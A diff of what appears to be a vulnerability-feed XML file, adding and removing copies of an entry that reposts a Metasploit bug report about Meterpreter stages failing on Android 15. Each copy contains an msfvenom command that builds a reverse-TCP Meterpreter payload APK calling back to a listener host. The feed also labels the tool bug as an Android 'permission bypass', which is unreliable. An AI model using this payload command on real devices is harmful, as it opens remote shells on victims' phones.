@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>Android Dynamic Code Loading Restriction Vulnerability</title>
+    <link href="/2025/06/09/github_51786075/"/>
+    <url>/2025/06/09/github_51786075/</url>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Android Dynamic Code Loading Restriction Vulnerability</p><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 在Android 15（SDK 35）上，使用Pixel 6手机创建并运行一个恶意的.apk文件时，由于Android 14引入的动态代码加载限制，导致Meterpreter会话在阶段发送后失败。这表明存在一个权限绕过问题，可能通过<code>File.setReadOnly()</code>进行向后兼容的修复。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Android</p><p><strong>影响版本：</strong> 15 (SDK 35)</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20294">https://github.com/rapid7/metasploit-framework/issues/20294</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><p>Using a Pixel 6 phone running Android 15 (SDK 35).<br>Created a payload .apk with </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p android/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.129.114.9 <span class="hljs-attribute">LPORT</span>=4444 -o evil.apk<br></code></pre></td></tr></table></figure><p>I expect this is due to restrictions around dynamic code loading added in Android 14 (<a href="https://developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading">https://developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading</a>). I think there is an easy backwards-compatible fix with <code>File.setReadOnly()</code> so I will try to send a PR.</p><h2 id="Expected-behavior"><a href="#Expected-behavior" class="headerlink" title="Expected behavior"></a>Expected behavior</h2><p>Stage sends &#x2F; is run successfully and full Meterpreter session is opened.</p><h2 id="Current-behavior"><a href="#Current-behavior" class="headerlink" title="Current behavior"></a>Current behavior</h2><p>Phone logs showing code loading error:<br><img src="https://github.com/user-attachments/assets/c3203ba0-305b-4ec0-8633-639c642c4d31" alt="Image"><br>Sessions are opening but fail when stage times out:<br><img src="https://github.com/user-attachments/assets/bd0d1aff-dbc7-49c0-97fd-6d8c2970dad8" alt="Image"></p><h3 id="Metasploit-version"><a href="#Metasploit-version" class="headerlink" title="Metasploit version"></a>Metasploit version</h3><p>Framework: 6.4.55-dev-<br>Console  : 6.4.55-dev-</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>rapid7/metasploit-framework:github issues</tag>
+      
+      <tag>权限绕过</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Remote Desktop Services 远程代码执行漏洞</title>
     <link href="/2025/06/09/github_1857188022/"/>
     <url>/2025/06/09/github_1857188022/</url>
@@ -158,33 +185,6 @@
       <tag>mp.weixin.qq.com</tag>
       
       <tag>军哥网络安全读报</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Android 动态代码加载限制漏洞</title>
-    <link href="/2025/06/08/github_51786075/"/>
-    <url>/2025/06/08/github_51786075/</url>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Android 动态代码加载限制漏洞</p><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 在Android 15 (SDK 35)上，使用Pixel 6手机运行通过msfvenom生成的恶意.apk文件时，由于Android 14引入的动态代码加载限制，导致Meterpreter会话在发送阶段后失败。当前行为表现为会话打开但在阶段超时时失败，预计通过使用<code>File.setReadOnly()</code>可以提供一个向后兼容的修复方案。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Android</p><p><strong>影响版本：</strong> 15 (SDK 35)</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20294">https://github.com/rapid7/metasploit-framework/issues/20294</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## Steps to reproduce<br><br>Using a Pixel <span class="hljs-number">6</span> phone running Android <span class="hljs-number">15</span> (SDK <span class="hljs-number">35</span>).<br>Created a payload .apk <span class="hljs-keyword">with</span> <br>\`\`\`<br>msfvenom -p android/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.129</span><span class="hljs-number">.114</span><span class="hljs-number">.9</span> LPORT=<span class="hljs-number">4444</span> -o evil.apk<br>\`\`\`<br><br>I expect this is due to restrictions around dynamic <span class="hljs-keyword">code</span> loading added <span class="hljs-keyword">in</span> Android <span class="hljs-number">14</span> (https:<span class="hljs-comment">//developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading). I think there is an easy backwards-compatible fix with \`File.setReadOnly()\` so I will try to send a PR.</span><br><br>## Expected behavior<br><br>Stage sends / is run successfully and full Meterpreter session is opened.<br><br>## Current behavior<br><br>Phone logs showing <span class="hljs-keyword">code</span> loading error:<br>![Image](https:<span class="hljs-comment">//github.com/user-attachments/assets/c3203ba0-305b-4ec0-8633-639c642c4d31)</span><br>Sessions are opening but fail when stage times out:<br>![Image](https:<span class="hljs-comment">//github.com/user-attachments/assets/bd0d1aff-dbc7-49c0-97fd-6d8c2970dad8)</span><br><br>### Metasploit version<br><br>Framework: <span class="hljs-number">6.4</span><span class="hljs-number">.55</span>-dev-<br>Console  : <span class="hljs-number">6.4</span><span class="hljs-number">.55</span>-dev-<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>Github Poc</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>rapid7/metasploit-framework:github issues</tag>
-      
-      <tag>权限绕过</tag>
       
     </tags>
     
